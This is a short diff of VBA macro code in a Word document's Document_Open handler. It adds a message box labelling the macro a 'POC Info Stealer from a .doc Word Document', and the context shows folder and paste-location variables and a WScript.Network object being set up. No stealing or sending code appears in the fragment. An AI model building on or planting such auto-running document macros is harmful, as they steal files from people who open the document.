@@ -15,6 +15,7 @@ End Sub
 
 Private Sub Document_Open()
 'On Error Resume Next
+MsgBox "POC Info Stealer from a .doc Word Document"
 Dim FSO As Object
 Dim targetfolder1, targetfolder2, targetfolder3, targetfolder4, pasteloc1, pasteloc2, pasteloc3, pasteloc4, targetfile1 As String
 Set wshNetwork = CreateObject("WScript.Network")
